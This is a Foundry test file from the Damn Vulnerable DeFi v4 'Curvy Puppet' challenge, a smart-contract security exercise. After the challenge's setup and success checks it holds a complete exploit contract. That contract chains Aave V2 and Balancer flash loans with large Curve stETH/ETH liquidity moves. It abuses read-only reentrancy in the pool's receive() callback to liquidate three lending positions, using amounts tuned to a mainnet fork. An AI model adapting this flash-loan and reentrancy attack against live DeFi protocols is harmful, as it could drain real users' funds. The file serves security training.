// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        IERC20 curveLpToken = IERC20(curvePool.lp_token());

        CurvyPuppetExploit exploit = new CurvyPuppetExploit({
            _curvePool: curvePool,
            _lending: lending,
            _permit2: permit2,
            _curveLpToken: curveLpToken,
            _stETH: stETH,
            _weth: weth,
            _dvt: dvt,
            _treasury: treasury
        });

        // Move treasury funds to the exploit contract (player is already approved)
        curveLpToken.transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
        weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);

        address[] memory users = new address[](3);
        users[0] = alice;
        users[1] = bob;
        users[2] = charlie;

        exploit.execute(users);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}

interface IAaveV2LendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

contract CurvyPuppetExploit {
    // Mainnet addresses
    IAaveV2LendingPool private constant AAVE_V2 = IAaveV2LendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IBalancerVault private constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    IStableSwap private immutable curvePool;
    CurvyPuppetLending private immutable lending;
    IPermit2 private immutable permit2;
    IERC20 private immutable curveLpToken;
    IERC20 private immutable stETH;
    WETH private immutable weth;
    DamnValuableToken private immutable dvt;
    address private immutable treasury;

    address[] private users;
    bool private didLiquidate;

    // Tuned amounts known to work on the provided mainnet fork block
    uint256 private constant AAVE_STETH_AMOUNT = 172_000e18;
    uint256 private constant AAVE_WETH_AMOUNT = 20_500e18;
    uint256 private constant BALANCER_WETH_AMOUNT = 37_991e18;
    uint256 private constant CURVE_ADD_LIQ_ETH_AMOUNT = 58_685e18;
    uint256 private constant LP_LEFTOVER = 3e18 + 1;

    constructor(
        IStableSwap _curvePool,
        CurvyPuppetLending _lending,
        IPermit2 _permit2,
        IERC20 _curveLpToken,
        IERC20 _stETH,
        WETH _weth,
        DamnValuableToken _dvt,
        address _treasury
    ) {
        curvePool = _curvePool;
        lending = _lending;
        permit2 = _permit2;
        curveLpToken = _curveLpToken;
        stETH = _stETH;
        weth = _weth;
        dvt = _dvt;
        treasury = _treasury;
    }

    function execute(address[] memory _users) external {
        users = _users;

        // Permit2 approvals for liquidation repayment (LP token)
        curveLpToken.approve(address(permit2), type(uint256).max);
        permit2.approve({
            token: address(curveLpToken),
            spender: address(lending),
            amount: type(uint160).max,
            expiration: uint48(block.timestamp + 1 days)
        });

        // Start flashloan from Aave V2 (stETH + WETH)
        address[] memory assets = new address[](2);
        assets[0] = address(stETH);
        assets[1] = address(weth);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = AAVE_STETH_AMOUNT;
        amounts[1] = AAVE_WETH_AMOUNT;

        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;

        AAVE_V2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);

        // Ensure treasury ends up with some WETH (challenge requires > 0)
        if (weth.balanceOf(address(this)) == 0) {
            // Get a tiny amount of ETH if needed
            if (address(this).balance == 0) {
                // swap a tiny amount of stETH -> ETH
                curvePool.exchange(1, 0, 1e12, 1);
            }
            if (address(this).balance > 0) {
                weth.deposit{value: 1}();
            }
        }

        // Send rescued collateral to treasury
        dvt.transfer(treasury, dvt.balanceOf(address(this)));

        // Return any leftovers to treasury (keep player with 0 balances)
        uint256 wethBal = weth.balanceOf(address(this));
        if (wethBal > 0) weth.transfer(treasury, wethBal);
        uint256 lpBal = curveLpToken.balanceOf(address(this));
        if (lpBal > 0) curveLpToken.transfer(treasury, lpBal);
        uint256 stEthBal = stETH.balanceOf(address(this));
        if (stEthBal > 0) stETH.transfer(treasury, stEthBal);

        // Flush any stray ETH to treasury
        if (address(this).balance > 0) payable(treasury).transfer(address(this).balance);
    }

    // Aave V2 callback
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE_V2), "not aave");

        _balancerFlashLoanWeth();
        _topUpForAaveRepayment(amounts, premiums);
        _approveAavePull(assets, amounts, premiums);

        return true;
    }

    function _balancerFlashLoanWeth() private {
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory balAmounts = new uint256[](1);
        balAmounts[0] = BALANCER_WETH_AMOUNT;
        BALANCER_VAULT.flashLoan(address(this), tokens, balAmounts, bytes(""));
    }

    function _topUpForAaveRepayment(uint256[] calldata amounts, uint256[] calldata premiums) private {
        // 1) stETH: top up by swapping the minimum ETH needed (binary search using get_dy)
        uint256 requiredStEth = amounts[0] + premiums[0];
        uint256 haveStEth = stETH.balanceOf(address(this));
        if (haveStEth < requiredStEth) {
            uint256 deficit = requiredStEth - haveStEth;
            uint256 dx = _minEthInForStEthOut(deficit);
            curvePool.exchange{value: dx}(0, 1, dx, 1);
        }

        // 2) WETH: wrap ETH for the remaining repayment needs
        uint256 requiredWeth = amounts[1] + premiums[1];
        uint256 haveWeth = weth.balanceOf(address(this));
        if (haveWeth < requiredWeth) {
            uint256 wrapAmount = requiredWeth - haveWeth;
            if (address(this).balance < wrapAmount) {
                uint256 missingEth = wrapAmount - address(this).balance;
                curvePool.exchange(1, 0, missingEth + 1 ether, 1);
            }
            weth.deposit{value: wrapAmount}();
        }
    }

    function _approveAavePull(address[] calldata assets, uint256[] calldata amounts, uint256[] calldata premiums) private {
        for (uint256 i = 0; i < assets.length; i++) {
            IERC20(assets[i]).approve(address(AAVE_V2), amounts[i] + premiums[i]);
        }
    }

    function _minEthInForStEthOut(uint256 desiredStEthOut) private view returns (uint256) {
        // Find the smallest dx such that get_dy(ETH->stETH, dx) >= desiredStEthOut
        // Upper bound: 2x desired, enough even with significant fee/price impact.
        uint256 low = 0;
        uint256 high = desiredStEthOut * 2;

        while (low < high) {
            uint256 mid = (low + high) / 2;
            uint256 dy = curvePool.get_dy(0, 1, mid);
            if (dy >= desiredStEthOut) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }

        // Add 1 wei to dodge edge rounding at execution time
        return low + 1;
    }

    // Balancer callback
    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        require(msg.sender == address(BALANCER_VAULT), "not balancer");
        require(tokens.length == 1 && tokens[0] == address(weth), "unexpected token");
        require(amounts[0] == BALANCER_WETH_AMOUNT, "unexpected amount");

        // 1) Add huge liquidity to Curve (needs ETH) so that removing liquidity later produces a read-only reentrancy window
        stETH.approve(address(curvePool), type(uint256).max);
        curveLpToken.approve(address(curvePool), type(uint256).max);

        // Convert WETH -> ETH for Curve deposit
        weth.withdraw(CURVE_ADD_LIQ_ETH_AMOUNT);

        uint256[2] memory depositAmounts;
        depositAmounts[0] = CURVE_ADD_LIQ_ETH_AMOUNT;
        depositAmounts[1] = stETH.balanceOf(address(this));
        curvePool.add_liquidity{value: CURVE_ADD_LIQ_ETH_AMOUNT}(depositAmounts, 0);

        // 2) Remove liquidity; Curve will send ETH and trigger our receive() where we liquidate positions
        uint256[2] memory minAmounts = [uint256(0), uint256(0)];
        uint256 lpBal = curveLpToken.balanceOf(address(this));
        curvePool.remove_liquidity(lpBal - LP_LEFTOVER, minAmounts);

        // 3) Repay Balancer (wrap ETH back to WETH)
        uint256 repay = amounts[0] + feeAmounts[0];
        weth.deposit{value: repay}();
        weth.transfer(address(BALANCER_VAULT), repay);

        // Aave premium top-ups are handled in executeOperation(), where premiums[] is known.
    }

    receive() external payable {
        if (msg.sender != address(curvePool) || didLiquidate) return;
        didLiquidate = true;

        for (uint256 i = 0; i < users.length; i++) {
            lending.liquidate(users[i]);
        }
    }
}